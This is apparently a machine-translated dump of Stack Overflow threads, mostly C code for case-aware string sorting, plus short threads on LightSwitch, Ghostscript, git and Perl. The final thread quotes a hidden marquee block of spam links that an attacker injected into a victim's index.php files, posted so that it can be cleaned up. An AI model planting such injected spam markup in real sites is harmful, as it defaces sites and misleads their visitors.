        }
        /* now run through the alphaBeticals */
        for (i = 0; alphaBetical[i]; ++i) {
            table[(int)alphaBetical[i]] = j++;
        }
        initialized = 1;
    }
    /* return the computed ordinal of the provided character */
    if (c < 0 || c > CHAR_MAX) return c;
    return table[c];
} 
```

With this look-up table, we can now simplify the loop body of the `alphaBetize()` comparison function:

```
int alphaBetize (const char *a, const char *b) {
    int ax = alphaBeta_lookup(*a);
    int bx = alphaBeta_lookup(*b);
    int weight = 0;
    do {
        char al = tolower(*a);
        char bl = tolower(*b);
        if (ax != bx) {
            if (al != bl) {
                return alphaBeta_lookup(al) - alphaBeta_lookup(bl);
            }
            if (weight == 0) {
                weight = ax - bx;
            }
        }
        ax = alphaBeta_lookup(*++a);
        bx = alphaBeta_lookup(*++b);
    } while (ax && bx);
    /* if the words compared equal, use the weight as tie breaker */
    return (ax != bx) ? !bx - !ax : weight;
} 
```

# Can we make things simpler?

Using the collating table, you can create many different orderings with a simplified comparison function, like:

```
int simple_collating (const char *a, const char *b) {
    while (alphaBeta_lookup(*a) == alphaBeta_lookup(*b)) {
        if (*a == '\0') break;
        ++a, ++b;
    }
    return alphaBeta_lookup(*a) - alphaBeta_lookup(*b);
} 
```

Using this same function and through modifying the `alphaBetical` string, you can achieve nearly any ordering you want (alphabetical, reverse alphabetical, vowels before consonants, etc.). However, the arrangement of keeping alike words together requires interspersing capitalized words with words in lowercase, and this can only be done by doing a comparison that ignores case.

Note that with the `simple_collating()` function above and the `alphaBetical` string I provided, `Bacon` will come before `milk`, but `Mars` will go after `milk` and before `Milk`.

# If you want to sort based on your locale.

If you want to use a collating sequence that is already defined for your locale, you can set the locale and call the collating comparison function:

```
/*
 * To change the collating locale, use (for example):
       setlocale(LC_COLLATE, "en.US");
 */
int iso_collating (const char *a, const char *b) {
    return strcoll(a, b);
} 
```

Now, by changing the locale, the sorting order will be based on a standardized collating sequence.

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2014-08-22T23:13:29.133

您可以为排序编写自定义比较函数。

首先，看一下默认的[strcmp](http://pubs.opengroup.org/onlinepubs/009695399/functions/strcmp.html)排序顺序：

```
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>

const char *tgt[]={
    "bacon", "Bacon", "mIlk", "Milk", "spinach", "MILK", "milk", "eggs"
};
int tgt_size=8;

static int cmp(const void *p1, const void *p2){
    return strcmp(* (char * const *) p1, * (char * const *) p2);
}

int main(int argc, char *argv[]) {
    printf("Before sort:\n\t");
    for(int n=0; n<tgt_size; n++)
        printf("%s ", tgt[n]);

    qsort(tgt, tgt_size, sizeof(char *), cmp);

    printf("\nAfter sort:\n\t");
    for(int n=0; n<tgt_size; n++)
        printf("%s ", tgt[n]);

    return 0;
} 
```

`strcmp`按 ASCII 字符代码排序；即，它会排序`A-Z`，所以`a-z`所有大写的 AZ 都在任何带有小写字母的单词之前：

```
Before sort:
    bacon Bacon mIlk Milk spinach MILK milk eggs 
After sort:
    Bacon MILK Milk bacon eggs mIlk milk spinach 
```

我们可以编写自己的比较函数，`cmp`用于`qsort`忽略大小写。看起来像这样：

```
int mycmp(const char *a, const char *b) {
    const char *cp1 = a, *cp2 = b;

    for (; toupper(*cp1) == toupper(*cp2); cp1++, cp2++)
        if (*cp1 == '\0')
            return 0;
    return ((toupper(*cp1) < toupper(*cp2)) ? -1 : +1);
} 
```

请务必更改`cmp`为：

```
static int cmp(const void *p1, const void *p2){
    return mycmp(* (char * const *) p1, * (char * const *) p2);
} 
```

忽略大小写的版本现在打印：

```
Before sort:
    bacon Bacon mIlk Milk spinach MILK milk eggs 
After sort:
    bacon Bacon eggs Milk MILK milk mIlk spinach 
```

这与使用 POSIX 函数[strcasecmp](http://pubs.opengroup.org/onlinepubs/009695399/functions/strcasecmp.html)获得的输出相同。

该函数`mycmp`首先按正常顺序按字典顺序进行比较`[a|A]-[z|Z]`。这意味着你会得到像字母一样的单词，但你可能会得到`bacon, Bacon`尽可能多的单词`Bacon, bacon`。这是因为 qsort 不是一个[稳定的排序](http://en.wikipedia.org/wiki/Sorting_algorithm#Stability)，'Bacon' 比较等于 'bacon'。

现在我们想要的是如果比较为 0 而忽略大小写（即，像“MILK”和“牛奶”这样的同一个词）现在比较包括大小写并颠倒顺序：

```
int mycmp(const char *a, const char *b) {
    const char *cp1 = a, *cp2 = b;
    int sccmp=1;

    for (; toupper(*cp1) == toupper(*cp2); cp1++, cp2++)
        if (*cp1 == '\0')
            sccmp = 0;
    if (sccmp) return ((toupper(*cp1) < toupper(*cp2)) ? -1 : +1);

    for (; *a == *b; a++, b++)
        if (*a == '\0')
            return 0;
    return ((*a < *b) ? +1 : -1);
} 
```

最终版本打印：

```
Before sort:
    bacon Bacon mIlk Milk spinach MILK milk eggs 
After sort:
    bacon Bacon eggs milk mIlk Milk MILK spinach 
```

不幸的是，这种方法对于 UNICODE 来说变得笨拙。对于复杂排序，请考虑使用映射或多步排序和[稳定排序](http://en.wikipedia.org/wiki/Sorting_algorithm#Comparison_of_algorithms)。

对于复杂和位置感知的字母排序规则，请考虑[Unicode 排序规则](http://www.unicode.org/reports/tr10/#Introduction)。例如，在不同的位置，字母的字母顺序不同：

```
Swedish                      z < ö
                             y == w
German                       ö < z
Danish                       Z < Å
Lithuanian                   i < y < k
Tr German                    ä == æ
Tr Spanish                   c < ch < d   
German Dictionary Sort:      of < öf
German Phonebook Sort:       öf < of 
```

这些区别的默认值在默认 Unicode 归类元素表 ( [DUCET](http://www.unicode.org/Public/UCA/6.0.0/allkeys.txt) ) 中捕获，该表为 UNICODE 归类和字符串比较提供默认映射。您可以修改默认值以捕获字典排序和电话簿排序之间的区别、不同的位置或不同的大小写处理。[在 Unicode 通用区域设置数据存储库 ( CLDR](http://cldr.unicode.org) )中主动跟踪各个位置变化。

多级排序的推荐是分层的：

```
Level   Description           Examples
L1      Base characters       role < roles < rule
L2      Accents               role < rôle < roles
L3      Case/Variants         role < Role < rôle
L4      Punctuation           role < “role” < Role
Ln      Identical             role < ro□le < “role” 
```

[ICU 库](http://site.icu-project.org)中广泛使用了 Unicode 排序规则的实现。几个示例的默认 DUCET 排序规则是：

```
b < B < bad < Bad < bäd
c < C < cote < coté < côte < côté 
```

[您可以使用ICU Explorer 浏览](http://demo.icu-project.org/icu-bin/locexp?_=en_US&d_=en&x=col)ICU 库并更改位置和目标

如果你想实现你自己的 DUCET 版本，你可以按照这个[Python 脚本](http://jtauber.com/blog/2006/01/27/python_unicode_collation_algorithm/)中使用的通用方法。这不是压倒性的，但也不是微不足道的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-08-23T10:49:11.777

在这里，如果我做对了，你想要一些我会描述如下的东西：

*不区分大小写的排序，在平局下，将使用决胜局条件“小写优先”。*

所以它就像：

1.  `earlier_letter_in_the_alphabet < later_letter_in_the_alphabet`无视案件

2.  `lowercase < uppercase`

3.  `shorter_word < wider_word`
    *   这个没有提到，我是从字典顺序借来的，字典里的那个
    *   可以简单地通过`'\0'`在比较中取最低值来使用

仅当 1 没有区分任何内容时才执行第 2 步。步骤 3 已经用 1 进行检查。所有这些都将逐个字母地完成，这意味着您应该在相应字符之间获得平局时立即切换到 2，而不仅仅是当整个字符串平局时。

* * *

假设这是正确的，我们现在需要做的就是编写一个函数，为我们对任何给定的两个字符串进行比较。

```
#include <ctype.h>  // for tolower and islower

int my_character_compare(const char a, const char b)
{
    int my_result;

    my_result = tolower(a) - tolower(b);
    // unless it is zero, my_result is definitely the result here
    // Note: if any one of them was 0, result will also properly favour that one

    if (my_result == 0 && a != b)
    // if (could not be distinguished with #1, but are different)
    {
        // means that they are case-insensitively same
        // but different...
        // means that one of them are lowercase, the other one is upper
        if (islower(a))
            return -1;  // favour a
        else
            return 1;   // favour b
    }

    // regardless if zero or not, my_result is definitely just the result
    return my_result;
}

int my_string_compare(const char * a, const char * b)
{
    int my_result;

    my_result = my_character_compare(*a, *b);
    // unless it is zero, my_result is definitely the result here

    while (my_result == 0 && *a != 0)
    // current characters deemed to be same
    // if they are not both just 0 we will have to check the next ones
    {
        my_result = my_character_compare(*++a, *++b);
    }

    // whatever the my_result has been:
    //   whether it became != zero on the way and broke out of the loop
    //   or it is still zero, but we have also reached the end of the road/strings
    return my_result;
} 
```

根据约定/规则，比较函数应该返回负值以支持第一个参数在前面，负值表示支持第二个参数，如果无法区分它们，则返回零。只是一个附加信息，您可能已经通过使用`strcmp`.

就是这样！`strcmp`在您的代码中将其替换为`my_string_compare`此处，并将我们所做的这些定义放在上面应该提供正确的结果。实际上，它为有问题的示例输入提供了预期的结果。

当然，可以缩短定义，我把它们写得很长，以便更容易理解发生了什么。例如，我可以将其归结为以下内容：

```
#include <ctype.h>

int my_string_compare(const char * a, const char * b)
{
    int my_result;

    while (*a || *b)
    {
        if ((my_result = tolower(*a) - tolower(*b)))
            return my_result;
        if (*a != *b)
            return (islower(*a)) ? -1 : 1;
        a++;
        b++;
    }

    return 0;
} 
```

与另一个基本相同，您可以使用任何您喜欢的；甚至更好，写一个。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-08-23T02:48:46.517

OP 代码的关键是使用函数`strcmp()`来比较两个字符串。
因此，我将首先用另一个标准函数替换这个标准函数，如下所示：

```
 // We assume that the collating sequence satisfies the following rules:
  // 'A' < 'B' < 'C' < ...
  // 'a' < 'b' < 'c' < ...
  // We don't make any other assumptions.

  #include <ctype.h>      
  int my_strcmp(const char * s1, const char * s2)
  {
      const char *p1 = s1, *p2 = s2;
      while(*p1 == *p2 && *p1 != '\0' && *p2 != '\0')
          p1++, p2++;  /* keep searching... */

      if (*p1 == *p2)
         return 0;
      if (*p1 == '\0')
         return -1;
      if (*p2 == '\0')
         return +1;

      char c1 = tolower(*p1),      c2 = tolower(*p2);
      int  u1 = isupper(*p1) != 0, u2 = isupper(*p2) != 0;
      if (c1 != c2)
        return c1 - c2;  // <<--- Alphabetical order assumption is used here 
      if (c1 == c2)
        return u1 - u2;
  } 
```

最后几行可以这样压缩：

```
 return (c1 != c2)? c1 - c2: u1 - u2; 
```

现在，通过替换`strcmp()`，`my_strcmp()`您将获得所需的结果。

在排序算法中，最好分别考虑它的三个主要方面：

*   比较函数。
*   我们将使用的抽象排序算法。
*   当必须交换两个项目时，该数据的方式将在数组中“移动”。

这些方面可以独立优化。
因此，例如，一旦你很好地解决了比较函数，下一个优化步骤可能是用更有效的算法替换**双精度排序算法，比如****快速排序**。
特别是`qsort()`标准库的功能`<stdlib.h>`为你提供了这样的算法，所以你不需要关心编程。
最后，用于存储阵列信息的策略可能会对性能产生影响。
存储诸如“char 指针数组”而不是“char 数组数组”之类的字符串会更有效，因为交换指针比交换两个完整的字符数组更快。

[指针数组](http://ee.hawaii.edu/~tep/EE160/Book/chap9/section2.1.4.html)

**附加说明：**三个 first`if()`实际上是多余的，因为以下句子的逻辑暗示在`*p1`or`*p2`为 0 的情况下所需的结果。但是，通过保留这些`if()`'s，代码变得更具可读性。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2014-08-28T17:13:06.403

我在这个讨论中迟到了，并且没有特别期望去参加并获得神话般的奖品，但没有看到使用我首先寻找的成语的解决方案，我想我会插话。

在阅读问题规范时，我的第一个想法是某种形式的自定义整理顺序，我基本上是在 @jxh 的**使用整理表**概念中找到的。我不认为不区分大小写是核心概念，只是奇怪的排序。

因此，我提供以下代码纯粹作为替代实现。它特定于 glibc -使用*了 qsort_r(3)* - 但感觉像是一种轻量级的方法，并且在运行时支持许多整理序列。但它经过了轻微的测试，我很可能会遗漏各种弱点。其中：我没有特别关注 Unicode 或一般的宽字符世界，并且为避免负数组下标而强制转换为 unsigned char 让人感到怀疑。

```
#include <stdio.h>
#include <limits.h>

/*
 * Initialize an index array associated with the collating
 * sequence in co. The affected array can subsequently be
 * passed in as the final client data pointer into qsort_r
 * to be used by collating_compare below.
 */
int
collating_init(const char *co, int *cv, size_t n)
{
    const unsigned char *uco = (const unsigned char *) co;
    const unsigned char *s;
    size_t i;

    if (n <= UCHAR_MAX) {
        return -1;
    }
    for (i = 0; i < n; i++) {
        /* default for chars not named in the sequence */
        cv[i] = UCHAR_MAX;
    }
    for (s = uco; *s; s++) {
        /*
         * the "collating value" for a character's own
         * character code is its ordinal (starting from
         * zero) in the collating sequence. I.e., we
         * compare the values of cv['a'] and cv['A'] -
         * rather than 'a' and 'A' - to determine order.
         */
        cv[*s] = (s - uco);
    }

    return 0;
}

static int
_collating_compare(const char *str1, const char *str2, int *ip)
{
    const unsigned char *s1 = (const unsigned char *) str1;
    const unsigned char *s2 = (const unsigned char *) str2;

    while (*s1 != '\0' && *s2 != '\0') {
        int cv1 = ip[*s1++];
        int cv2 = ip[*s2++];

        if (cv1 < cv2) return -1;
        if (cv1 > cv2) return 1;
    }

    if (*s1 == '\0' && *s2 == '\0') {
        return 0;
    } else {
        return *s1 == '\0' ? -1 : 1;
    }
}

int
collating_compare(const void *v1, const void *v2, void *p)
{
    return _collating_compare(*(const char **) v1,
                              *(const char **) v2,
                              (int *) p);
} 
```

前者接近于可以放在单独的模块或库中的代码，但缺少自己的头文件（或头文件中的条目）。我自己的测试只是将上面和下面的代码连接到一个名为 custom_collat​​e_sort.c 的文件中，并使用

```
gcc -DMAIN_TEST -Wall -o custom_collate_sort custom_collate_sort.c 
```

...编译它。

```
#if defined(MAIN_TEST)

/* qsort_r is a GNU-ey thing... */

#define __USE_GNU
#include <stdlib.h>
#include <string.h>

#define NELEM(x) (sizeof x / sizeof 0[x])

static int
cmp(const void *v1, const void *v2)
{
    return strcmp(*(const char **) v1, *(const char **) v2);
}

static int
casecmp(const void *v1, const void *v2)
{
    return strcasecmp(*(const char **) v1, *(const char **) v2);
}

int
main(int ac, char *av[])
{
    size_t i;

    int cval[256], ret;
    int cval_rev[256], rret;

    char *tosort[] = {
        "cheeSE", "eggs", "Milk", "potatoes", "cheese", "spaghetti",
        "eggs", "milk", "spinach", "bacon", "egg", "apple", "PEAR",
        "pea", "berry"
    };

    ret = collating_init("aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVxXyYzZ",
                         cval, NELEM(cval));

    rret = collating_init("ZzYyXxVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa",
                          cval_rev, NELEM(cval_rev));

    if (ret == -1 || rret == -1) {
        fputs("collating value array must accomodate an index of UCHAR_MAX\n", stderr);
        return 1;
    }

    puts("Unsorted:");
    for (i = 0; i < NELEM(tosort); i++) {
        printf("  %s\n", tosort[i]);
    }

    qsort((void *) tosort, NELEM(tosort), sizeof tosort[0], cmp);

    puts("Sorted w/ strcmp:");
    for (i = 0; i < NELEM(tosort); i++) {
        printf("  %s\n", tosort[i]);
    }

    qsort((void *) tosort, NELEM(tosort), sizeof tosort[0], casecmp);

    puts("Sorted w/ strcasecmp:");
    for (i = 0; i < NELEM(tosort); i++) {
        printf("  %s\n", tosort[i]);
    }

    qsort_r((void *) tosort, NELEM(tosort), sizeof tosort[0],
            collating_compare, (void *) cval);

    puts("Sorted w/ collating sequence:");
    for (i = 0; i < NELEM(tosort); i++) {
        printf("  %s\n", tosort[i]);
    }

    qsort_r((void *) tosort, NELEM(tosort), sizeof tosort[0],
            collating_compare, (void *) cval_rev);

    puts("Sorted w/ reversed collating sequence:");
    for (i = 0; i < NELEM(tosort); i++) {
        printf("  %s\n", tosort[i]);
    }

    return 0;
}

#endif /* MAIN_TEST */ 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-08-25T12:36:24.207

程序所需的标准头文件：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
```

主程序从这里开始：

```
//Global Variables Required
//=========
const char *tgt[]={"bacon", "Bacon", "mIlk", 
        "Milk", "spinach", "MILK", "milk", "eggs"};    //Array for sorting
int tgt_size=8;                                        //Total Number of Records
int     SortLookupTable[128];                          //Custom sorting table
typedef int      cmp_t (const void *, const void *);

int main(int argc, char *argv[]) {
    printf("Before sort:\n\n");
    int n=0;
    for(n=0; n<tgt_size; n++)
        printf("%s\n", tgt[n]);

    CreateSortTable();

    myQsort(tgt, tgt_size, sizeof(char *), &compare);
    printf("\n\n====\n\n");
    for(n=0; n<tgt_size; n++)
        printf("%s\n", tgt[n]);

    return 0;
} 
```

根据需要自定义排序表：

```
void CreateSortTable(void){
    int     i;
    for (i = 0; i < 128; i++){
        SortLookupTable[i] = 0;
    }
    char *s;
    s=(char *)malloc(64);
    memset(s, 0, 64);
    strcpy(s, "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ");

    i=1;
    for (; *s; s++){
        SortLookupTable[(int) ((unsigned char) *s)]=i;
        i++;
    }
} 
```

快速排序算法，您还可以使用提供的标准库：

```
//Some important Definations required by Quick Sort
=======
#define SWAPINIT(a, es) swaptype = ((char *)a - (char *)0) % sizeof(long) || \
    es % sizeof(long) ? 2 : es == sizeof(long)? 0 : 1;

#define swap(a, b)                          \
    if (swaptype == 0) {                    \
        long t = *(long *)(a);              \
        *(long *)(a) = *(long *)(b);        \
        *(long *)(b) = t;                   \
    } else                                  \
        swapfunc(a, b, es, swaptype)

#define vecswap(a, b, n)    if ((n) > 0) swapfunc(a, b, n, swaptype)

#define swapcode(TYPE, parmi, parmj, n) {       \
    long i = (n) / sizeof (TYPE);               \
    register TYPE *pi = (TYPE *) (parmi);       \
    register TYPE *pj = (TYPE *) (parmj);       \
    do {                                        \
        register TYPE   t = *pi;                \
        *pi++ = *pj;                            \
        *pj++ = t;                              \
        } while (--i > 0);                      \
}

#define min(a, b)   (a) < (b) ? a : b

//Other important function
void swapfunc(char *a, char *b, int n, int swaptype){
    if(swaptype <= 1)
        swapcode(long, a, b, n)
    else
        swapcode(char, a, b, n)
}

char * med3(char *a, char *b, char *c, cmp_t *cmp){
    if ( cmp(a, b) < 0){
        if (cmp(b, c) < 0){
            return b;
        }else{
            if ( cmp(a, c) < 0){

                return c;
            }else{
                return a;
            }
        }
    }else{
        if (cmp(b, c) < 0){
            return b;
        }else{
            if ( cmp(a, c) < 0){
                return a;
            }else{
                return c;
            }
        }
    }
}

//Custom Quick Sort

void myQsort(void *a, unsigned int n, unsigned int es, cmp_t *cmp){
    char *pa, *pb, *pc, *pd, *pl, *pm, *pn;
    int d, r, swaptype, swap_cnt;

loop:   SWAPINIT(a, es);
    swap_cnt = 0;
    if (n < 7) {
        for (pm = (char *)a + es; pm < (char *)a + n * es; pm += es)
            for (pl = pm; pl > (char *)a && cmp(pl - es, pl) > 0; pl -= es){
                swap(pl, pl - es);
            }
        return;
    }
    pm = (char *)a + (n / 2) * es;
    if (n > 7) {
        pl = a;
        pn = (char *)a + (n - 1) * es;
        if (n > 40) {
            d = (n / 8) * es;
            pl = med3(pl, pl + d, pl + 2 * d, cmp);
            pm = med3(pm - d, pm, pm + d, cmp);
            pn = med3(pn - 2 * d, pn - d, pn, cmp);
        }
        pm = med3(pl, pm, pn, cmp);
    }
    swap(a, pm);
    pa = pb = (char *)a + es;

    pc = pd = (char *)a + (n - 1) * es;
    for (;;) {
        while (pb <= pc && (r = cmp(pb, a)) <= 0) {
            if (r == 0) {
                swap_cnt = 1;
                swap(pa, pb);
                pa += es;
            }
            pb += es;
        }
        while (pb <= pc && (r = cmp(pc, a)) >= 0) {
            if (r == 0) {
                swap_cnt = 1;
                swap(pc, pd);
                pd -= es;
            }
            pc -= es;
        }
        if (pb > pc)
            break;
        swap(pb, pc);
        swap_cnt = 1;
        pb += es;
        pc -= es;
    }
    if (swap_cnt == 0) {  /* Switch to insertion sort */
        for (pm = (char *)a + es; pm < (char *)a + n * es; pm += es)
            for (pl = pm; pl > (char *)a && cmp(pl - es, pl) > 0;
                 pl -= es)
                swap(pl, pl - es);
        return;
    }

    pn = (char *)a + n * es;
    r = min(pa - (char *)a, pb - pa);
    vecswap(a, pb - r, r);
    r = min(pd - pc, pn - pd - es);
    vecswap(pb, pn - r, r);
    if ((r = pb - pa) > es)
        myQsort(a, r / es, es, cmp);
    if ((r = pd - pc) > es) {
        /* Iterate rather than recurse to save stack space */
        a = pn - r;
        n = r / es;
        goto loop;
    }
} 
```

其中两个最重要的功能是：

```
unsigned char Change(char a){
    return (unsigned char ) SortLookupTable[(int)a];
}

int compare (const void *a, const void *b){
    char *s1= *(char **)a;
    char *s2= *(char **)b;
    int ret, len, i;
    ret=0;

    if (strlen((void*)s1) > strlen((void*)s2)){
        len=strlen((void*)s1);
    }else{
        len=strlen((void*)s2) ;
    }

    for(i=0; i<len; i++){
        if ( s1[i] != s2[i]){
            if ( Change(s1[i]) < Change(s2[i]) ){
                ret=0;
                break;
            }else{
                ret=1;
                break;
            }
        }
    }

    return ret;
} 
```

# visual-studio-lightswitch - LightSwitch - 在创建屏幕上显示相关表格信息

> ID：12646738
> 
> 赞同：2
> 
> 时间：2012-09-28T20:09:56.063
> 
> 标签：visual-studio-lightswitch

我已经`Table1`联系到`Table2`了一个`1 to 0..1`关系。`Table2`是只读的，来自另一个数据源。

在输入屏幕中输入`Field1`（定义 的键`Table2`）时，我希望`Table2`屏幕上的数据显示匹配的结果`Field1`。

例如：
`Table1`是“WidgetProblem”
`Table2`是“Widget”

当用户在小部件问题屏幕中输入小部件 ID 时，我希望小部件的详细信息显示在屏幕上，而无需先保存然后编辑/显示屏幕。我希望用户看到小部件信息，以便他们可以确定他们拥有正确的小部件。

字段都在那里，我只是不太清楚如何“尽早”触发数据查找。回到过去，我只是在现场处理一个事件，然后在屏幕上快速填充字段并完成。显然它在 LightSwitch 中是不一样的。谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T14:17:05.860

看到您已经创建了表之间的关系，*WidgetProblem*表/实体应该有一个添加的*导航属性*，很可能称为*Widget*（如果您没有更改名称）。您不需要自己处理 ID。

当您拖动其中一个*导航属性*（从屏幕设计器的左侧到控件树）时，LightSwitch 将为您显示一个*AutoCompleteBox （* *ComboBox*的一个花哨名称），因此用户将能够从小部件名称列表中选择所需的*小*部件，并自动为您存储 ID。

当您开始使用 LightSwitch 时，您有时确实不得不“忘记”您已经从其他技术中了解的内容。尝试以您在其他技术中的方式做事可能会导致挫败感，直到您学会“以 LightSwitch 方式”做事。

Beth Massi 制作的这组初学者视频[LightSwitch How Do I Videos](http://msdn.microsoft.com/en-us/vstudio/gg702681)应该为您提供成功创建 LS 应用程序所需的各种技术的良好基础。

# php - 无法让 Ghostscript 在 OpenBSD 上的 chroot 中运行

> ID：12646745
> 
> 赞同：0
> 
> 时间：2012-09-28T20:10:13.147
> 
> 标签：php, apache, ghostscript, chroot, openbsd

我有想要使用 gs (ghostscript) 将 .ps 转换为 pdf 的 webinstall。但它在 openBSD 4.9 上不起作用，因为“chroot”网络服务器（我想留在“chroot”目录中）我尝试将所有 ghostscript 文件复制到 chroot 目录 /var/www - 但它给了我错误：

```
gs:gs: undefined symbol 'gsapi_new_instance'
lazy binding failed!
Segmentation fault (core dumped) 
```

它也只能看到五个库：

```
# /bin/ldd  /bin/gs
    /bin/gs:
    Start    End      Type Open Ref GrpRef Name
    1c000000 3c004000 exe  1    0   0      /bin/gs
    08611000 28617000 rlib 0    1   0      /usr/lib/libgs.so.11.0
    023af000 223b5000 rlib 0    1   0      /usr/lib/libjpeg.so.64.0
    04d98000 24da1000 rlib 0    1   0      /usr/lib/libpthread.so.13.1
    01c3d000 21c71000 rlib 0    1   0      /usr/lib/libc.so.58.0
    028bc000 028bc000 rtld 0    1   0      /usr/libexec/ld.so 
```

在非 chroot 时：

```
# ldd gs                       
    gs:
    Start    End      Type Open Ref GrpRef Name
    1c000000 3c004000 exe  1    0   0      gs
    0f97d000 2fd19000 rlib 0    1   0      /usr/local/lib/libgs.so.11.0
    0a51c000 2a522000 rlib 0    2   0      /usr/local/lib/libjpeg.so.64.0
    0c537000 2c540000 rlib 0    1   0      /usr/lib/libpthread.so.13.1
    058ae000 258e2000 rlib 0    1   0      /usr/lib/libc.so.58.0
    08dbb000 28dc1000 rlib 0    1   0      /usr/local/lib/libpng.so.10.0
    0bd65000 2bd69000 rlib 0    1   0      /usr/local/lib/libijs.so.0.0
    0dbd9000 2dbe0000 rlib 0    1   0      /usr/lib/libz.so.4.1
    0ff75000 2ff7d000 rlib 0    1   0      /usr/lib/libm.so.5.2
    0a056000 2a135000 rlib 0    1   0      /usr/local/lib/libiconv.so.6.0
    0ce72000 0ce72000 rtld 0    1   0      /usr/libexec/ld.so 
```

所以我猜“gs”需要一些库？（ gs 在没有 chroot 的 cmd 行上工作正常。）

# javascript - 下载的aspx网站显示不好

> ID：12646746
> 
> 赞同：0
> 
> 时间：2012-09-28T20:10:13.397
> 
> 标签：javascript, asp.net, html

我已经下载了一个 aspx 网页并将其保存为 html。我在 IE 和 chrome 中打开它，加载需要时间 + 缺少某些部分。所有文本都在那里，但`onmouseover`无法正常工作，并且某些 css 无法正确显示。内容是否没有完全下载？即它是否缺少 sme javascript、css 或其他？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:18:21.333

为了在现有应用程序中组合新功能的原型，我已经多次完成了您所描述的操作。

您可能需要做几件事：

*   确保您的 JS 和 CSS 资源的路径正确（删除不必要的 JS 文件，如果有）
*   此外，您可能需要将 CSS 中的路径更新为页面中的任何图像资源

# git - git push initial to gitolite repository 失败，index-pack 不是 git 命令

> ID：12646748
> 
> 赞同：0
> 
> 时间：2012-09-28T20:10:22.287
> 
> 标签：git, gitolite

我向 gitolite-admin conf 添加了一个 repo 并成功推送

现在我想导入一个现有的存储库

当我调用 git push --all git@gitserver:mybeerrepo

我得到 git: 'index-pack' 不是 git 命令。错误：pack-objects 因奇怪的错误而死 错误：未能将一些引用推送到...

我检查了该用户的 .bashrc 文件，路径看起来不错

该存储库中的 git gc 似乎也运行良好

现在不知道下一步该做什么：-7

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T13:02:45.963

## 问题是由旧版本的 git 引起的

git 版本 1.6.xx 中似乎存在一个错误，该版本已安装在运行 gitolite 的服务器上。

客户端在 1.7.9.5 上，服务器在 1.6.xx 上，即使从服务器推送也失败了。

由于 git gc 运行良好，问题似乎仅在 index-packer 通过 push ssh 和 gitolite 运行并且 repo 中有一些特定文件（可能是种类、大小）时才存在。为了摆脱这个...

## 在 Suse Sles10 上安装新的 git 版本

我在 SLES 10 机器上从源代码安装了新版本的 git，因为旧的 suse 版本没有兼容的 rpm。

```
cd /root  
wget git-core.googlecode.com/files/git-1.7.8.4.tar.gz  
tar -xvpzf git-1.7.8.4.tar.gz  
cd git-1.7.8.4 
./configure --without-python  
make  
make install 
```

创建符号链接（如果需要，之前删除旧的 git 引用）

```
cd /usr/bin  
ln -s /usr/local/libexec/git-core/git  
ln -s /usr/local/libexec/git-core/git-receive-pack   
ln -s /usr/local/libexec/git-core/git-shell  
ln -s /usr/local/libexec/git-core/git-upload-archive  
ln -s /usr/local/libexec/git-core/git-upload-pack` 
```

# perl - eclipse 调试 perl 诅咒

> ID：12646756
> 
> 赞同：1
> 
> 时间：2012-09-28T20:11:09.263
> 
> 标签：perl, debugging, console, epic

我正在编写一个使用 curses 输出并移动光标和颜色字符的 Perl 程序。以前，当我在 Windows 下工作时，我使用 Komodo，它能够运行外部控制台。

现在我在Linux环境下工作，使用eclipse+epic。如果您尝试只运行脚本，它会使用内部控制台 eclipse，这非常简单。您可以使用外部工具运行脚本，但我有兴趣使用外部控制台窗口进行调试。这可能吗？

不幸的是，使用 File 和 /dev/pty/1 无助于解决我的问题。事实是，在这种情况下，通过curses getch() 获取控制台中引入的字符是不可能的。总是返回 1 而不是按键的代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T06:11:46.060

这是一个可以带你走大部分路的答案（基于：[http](http://ubuntuforums.org/showthread.php?t=743131) ://ubuntuforums.org/showthread.php?t=743131 的第 6 篇文章，尽管从那时起，在“Indigo”和“Juno”版本中在 Eclipse 中，事情发生了一些变化，这个答案是最新的）：

转到“运行 -> 调试配置”。单击（第四个）“通用”选项卡。转到从顶部开始的第三帧，然后在此处选中“文件”复选框。输入要在其中输出的控制台窗口的文件名。

# shell - 用于从服务器上的所有 index.php 文件中删除某些文本的 Shell 脚本

> ID：12646759
> 
> 赞同：0
> 
> 时间：2012-09-28T20:11:26.420
> 
> 标签：shell, text

似乎一些恶意脚本已经发现它进入了我保存网页的服务器。我有几个帐户，它们都被“感染”了（不确定这是否是正确的词）。

反正。所有 index.php 文件都添加了以下代码：

```
<marquee style="position: absolute; width: 0px;">
<a href="http://istanbulescort-ilan.com/" title="escort bayan">escort bayan</a>
<a href="http://istanbulescort-ilan.com/" title="bayan escort">bayan escort</a>
<a href="http://ankaraescortlari.org/" title="ankara escort">ankara escort</a>
<a href="http://ankaraescortlari.org/" title="ankara escort bayan">ankara escort bayan</a>
<a href="http://ankaraescortlari.org/" title="escort ankara">escort ankara</a>
...
<a href="http://hurhaberci.com" title="son haberler">son haberler</a>
</marquee> 
```

此代码弄乱了标题，网页呈现不佳。更不用说我的所有网页上都有一些护送服务链接。

我找到了这个脚本，但我不确定如何正确修改它以从服务器上每个帐户的所有 index.php 文件中删除所有上述代码。我不想运行它然后发现我必须恢复 hudge 备份。

```
for i in /directory/*.java
do
   # echo 'Working on $i file'
   copy $i tempfil.txt
   sed   -e '/\} catch/,/^\}/d' tempfil.txt > $i
done 
```

[编辑]

好的，所以我设法将其拼凑在一起。有人可以确认它会起作用或就应该更改的内容提供任何建议吗？

```
read -d '' hacked <<"EOF"
<marquee style="position: absolute; width: 0px;">
<a href="http://istanbulescort-ilan.com/" title="escort bayan">escort bayan</a>
...
<a href="http://gidasayfasi.com" title="gida">gida</a></marquee>
EOF
